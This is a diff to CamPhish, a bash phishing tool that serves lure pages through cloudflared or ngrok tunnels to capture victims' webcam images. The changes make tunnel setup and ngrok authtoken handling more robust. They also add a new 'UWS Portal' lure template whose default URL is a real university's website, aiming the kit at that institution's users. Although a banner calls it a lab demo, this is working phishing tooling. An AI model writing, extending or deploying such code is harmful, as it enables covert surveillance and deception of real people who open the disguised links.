@@ -40,6 +40,7 @@ printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) 
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
 printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
 printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;96m Lab Demo by Tahir Siddique \e[0m \n"
 
 printf "\n"
 
@@ -48,6 +49,153 @@ printf "\n"
 
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+}
+
+get_cloudflare_link() {
+local logfile="$1"
+if [[ ! -f "$logfile" ]]; then
+return 1
+fi
+grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' "$logfile" | head -n1
+}
+
+wait_for_cloudflare_link() {
+local logfile="$1"
+local attempt=0
+local link=""
+while [[ $attempt -lt 30 ]]; do
+link=$(get_cloudflare_link "$logfile")
+if [[ -n "$link" ]]; then
+printf "%s" "$link"
+return 0
+fi
+sleep 2
+attempt=$((attempt + 1))
+done
+return 1
+}
+
+cleanup_stale_servers() {
+if [[ "$windows_mode" == true ]]; then
+taskkill /F /IM "php.exe" 2>/dev/null
+taskkill /F /IM "cloudflared.exe" 2>/dev/null
+taskkill /F /IM "ngrok.exe" 2>/dev/null
+else
+pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
+pkill -f "cloudflared tunnel" > /dev/null 2>&1
+pkill -f "ngrok http" > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+sleep 1
+}
+
+ngrok_config_path() {
+if [[ "$windows_mode" == true ]]; then
+printf "%s\\ngrok.yml" "$(pwd)"
+else
+printf "%s/ngrok.yml" "$(pwd)"
+fi
+}
+
+ngrok_has_authtoken() {
+local config_file="$1"
+[[ -f "$config_file" ]] && grep -qE 'authtoken:[[:space:]]*[A-Za-z0-9_/-]+' "$config_file"
+}
+
+setup_ngrok_auth() {
+local ngrok_bin="$1"
+local config_file legacy_config
+config_file=$(ngrok_config_path)
+
+if ! ngrok_has_authtoken "$config_file"; then
+for legacy_config in "$HOME/.config/ngrok/ngrok.yml" "$HOME/.ngrok2/ngrok.yml"; do
+if ngrok_has_authtoken "$legacy_config"; then
+cp "$legacy_config" "$config_file"
+printf "\e[1;92m[\e[0m*\e[1;92m] Imported existing ngrok authtoken from %s\e[0m\n" "$legacy_config"
+break
+fi
+done
+fi
+
+if ngrok_has_authtoken "$config_file"; then
+printf "\e[1;93m[\e[0m*\e[1;93m] Using saved ngrok authtoken from %s\e[0m\n" "$config_file"
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Change ngrok authtoken? [y/N]:\e[0m ' chg_token
+if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your ngrok authtoken: \e[0m' ngrok_auth
+"$ngrok_bin" config add-authtoken "$ngrok_auth" --config="$config_file"
+fi
+return 0
+fi
+
+printf "\e[1;93m[\e[0m!\e[1;93m] Ngrok v3 requires a free account authtoken (this is mandatory).\e[0m\n"
+printf "\e[1;93m[\e[0m!\e[1;93m] Sign up free and copy your token from:\e[0m\n"
+printf "\e[1;77m    https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n\n"
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Paste your ngrok authtoken: \e[0m' ngrok_auth
+
+if [[ -z "$ngrok_auth" ]]; then
+printf "\e[1;31m[!] No authtoken provided. Ngrok cannot start without one.\e[0m\n"
+return 1
+fi
+
+if ! "$ngrok_bin" config add-authtoken "$ngrok_auth" --config="$config_file"; then
+printf "\e[1;31m[!] Failed to save ngrok authtoken. Check the token and try again.\e[0m\n"
+return 1
+fi
+
+if ! ngrok_has_authtoken "$config_file"; then
+printf "\e[1;31m[!] Authtoken was not saved correctly in %s\e[0m\n" "$config_file"
+return 1
+fi
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Ngrok authtoken saved successfully\e[0m\n"
+return 0
+}
+
+get_ngrok_link() {
+local api_response
+api_response=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null)
+if [[ -z "$api_response" ]]; then
+return 1
+fi
+echo "$api_response" | grep -oE 'https://[a-zA-Z0-9.-]+\.(ngrok-free\.app|ngrok-free\.dev|ngrok\.app|ngrok\.io)' | head -n1
+}
+
+wait_for_ngrok_link() {
+local attempt=0
+local link=""
+while [[ $attempt -lt 30 ]]; do
+link=$(get_ngrok_link)
+if [[ -n "$link" ]]; then
+printf "%s" "$link"
+return 0
+fi
+sleep 2
+attempt=$((attempt + 1))
+done
+return 1
+}
+
+check_cloudflared_config_conflict() {
+local config_file=""
+if [[ -f "$HOME/.cloudflared/config.yaml" ]]; then
+config_file="$HOME/.cloudflared/config.yaml"
+elif [[ -f "$HOME/.cloudflared/config.yml" ]]; then
+config_file="$HOME/.cloudflared/config.yml"
+fi
+if [[ -n "$config_file" ]]; then
+printf "\e[1;93m[\e[0m!\e[1;93m] Found %s — this can block TryCloudflare quick tunnels.\e[0m\n" "$config_file"
+printf "\e[1;93m[\e[0m!\e[1;93m] Temporarily renaming it for this session...\e[0m\n"
+mv "$config_file" "${config_file}.camphish.bak"
+cloudflared_config_backup="${config_file}.camphish.bak"
+fi
+}
+
+restore_cloudflared_config() {
+if [[ -n "$cloudflared_config_backup" && -f "$cloudflared_config_backup" ]]; then
+mv "$cloudflared_config_backup" "${cloudflared_config_backup%.camphish.bak}"
+cloudflared_config_backup=""
+fi
 }
 
 stop() {
@@ -177,6 +325,9 @@ done
 }
 
 cloudflare_tunnel() {
+if [[ -e cloudflared ]] && ! ./cloudflared --version > /dev/null 2>&1; then
+rm -f cloudflared cloudflared.exe
+fi
 if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
 echo ""
 else
@@ -259,38 +410,53 @@ else
 fi
 fi
 
+cleanup_stale_servers
+check_cloudflared_config_conflict
+
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-rm -rf .cloudflared.log > /dev/null 2>&1 &
+rm -f .cloudflared.log .cloudflared.out
 
 if [[ "$windows_mode" == true ]]; then
-    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared.exe tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info --logfile .cloudflared.log > .cloudflared.out 2>&1 &
 else
-    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
+    ./cloudflared tunnel --no-autoupdate --url http://127.0.0.1:3333 --loglevel info --logfile .cloudflared.log > .cloudflared.out 2>&1 &
 fi
 
-sleep 10
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+link=$(wait_for_cloudflare_link ".cloudflared.log")
+if [[ -z "$link" ]]; then
+link=$(wait_for_cloudflare_link ".cloudflared.out")
+fi
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run: killall cloudflared\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection (port 7844 must be open)\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url http://127.0.0.1:3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try: cloudflared.exe tunnel --url http://127.0.0.1:3333\n"
+if [[ -f ".cloudflared.log" ]]; then
+printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared log (last 10 lines):\e[0m\n"
+tail -n 10 .cloudflared.log
+fi
+if [[ -f ".cloudflared.out" ]]; then
+printf "\e[1;93m[\e[0m!\e[1;93m] cloudflared output (last 10 lines):\e[0m\n"
+tail -n 10 .cloudflared.out
+fi
+restore_cloudflared_config
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
 fi
-payload_cloudflare
+payload_cloudflare "$link"
+restore_cloudflared_config
 checkfound
 }
 
 payload_cloudflare() {
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+link="$1"
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
@@ -298,18 +464,28 @@ sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 3 ]]; then
 sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' UWS.html > index3.html
+sed 's+uws_site_url+'$uws_site_url'+g' index3.html > index2.html
+else
+printf "\e[1;93m [!] Invalid template option!\e[0m\n"
+exit 1
 fi
 rm -rf index3.html
 }
 
 ngrok_server() {
+if [[ -e ngrok ]] && ! ./ngrok version > /dev/null 2>&1; then
+rm -f ngrok ngrok.exe
+fi
 if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
 echo ""
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 
 # Detect architecture
@@ -386,67 +562,50 @@ else
 fi
 fi
 
-# Ngrok auth token handling
+cleanup_stale_servers
+
+local ngrok_bin ngrok_config
 if [[ "$windows_mode" == true ]]; then
-    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
-        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-        cat "$USERPROFILE\.ngrok2\ngrok.yml"
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-        fi
-    else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
-    fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-    sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok.exe http 3333 > /dev/null 2>&1 &
+ngrok_bin="./ngrok.exe"
 else
-    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-        cat  ~/.ngrok2/ngrok.yml
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-        fi
-    else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-    fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-    sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok http 3333 > /dev/null 2>&1 &
+ngrok_bin="./ngrok"
+fi
+ngrok_config=$(ngrok_config_path)
+
+if ! setup_ngrok_auth "$ngrok_bin"; then
+exit 1
 fi
 
-sleep 10
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
+sleep 2
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+rm -f .ngrok.log
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+"$ngrok_bin" http 127.0.0.1:3333 --config="$ngrok_config" --log=stdout > .ngrok.log 2>&1 &
+
+link=$(wait_for_ngrok_link)
 if [[ -z "$link" ]]; then
 printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is missing or invalid\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Get a free token: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run: killall ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try manually: %s http 127.0.0.1:3333 --config=%s\e[0m\n" "$ngrok_bin" "$ngrok_config"
+if [[ -f ".ngrok.log" ]]; then
+printf "\e[1;93m[\e[0m!\e[1;93m] ngrok log (last 10 lines):\e[0m\n"
+tail -n 10 .ngrok.log
+fi
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
 fi
-payload_ngrok
+payload_ngrok "$link"
 checkfound
 }
 
 payload_ngrok() {
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+link="$1"
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
@@ -454,8 +613,14 @@ sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 3 ]]; then
 sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
+elif [[ $option_tem -eq 4 ]]; then
+sed 's+forwarding_link+'$link'+g' UWS.html > index3.html
+sed 's+uws_site_url+'$uws_site_url'+g' index3.html > index2.html
+else
+printf "\e[1;93m [!] Invalid template option!\e[0m\n"
+exit 1
 fi
 rm -rf index3.html
 }
@@ -497,6 +662,7 @@ printf "\n-----Choose a template----\n"
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m UWS Portal\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
@@ -507,6 +673,10 @@ elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
 elif [[ $option_tem -eq 3 ]]; then
 printf ""
+elif [[ $option_tem -eq 4 ]]; then
+uws_site_url="https://www.uws.ac.uk/"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter UWS site URL [Default: https://www.uws.ac.uk/]: \e[0m' uws_site_input
+uws_site_url="${uws_site_input:-$uws_site_url}"
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
